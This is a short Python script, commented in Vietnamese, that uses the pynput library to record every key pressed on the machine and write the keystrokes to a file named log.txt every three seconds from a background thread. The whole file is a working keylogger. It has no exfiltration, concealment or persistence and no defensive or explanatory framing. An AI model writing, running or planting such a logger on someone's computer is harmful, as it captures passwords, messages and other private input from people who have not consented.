from pynput import keyboard
import time
import threading

log_buffer = []

def on_press(key):
    try:
        log_buffer.append(key.char)
    except AttributeError:
        log_buffer.append(f"[{key}]")

# Viết log vào file 
def write_log():
    while True:
        if log_buffer:
            with open("log.txt", "a", encoding="utf-8") as f:
                f.write("".join(log_buffer))
            log_buffer.clear()
        time.sleep(3) # ghi log mỗi 3 giây 

# thêm ghi log riêng biệt 
threading.Thread(target=write_log, daemon=True).start()

# Bắt phím 
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()     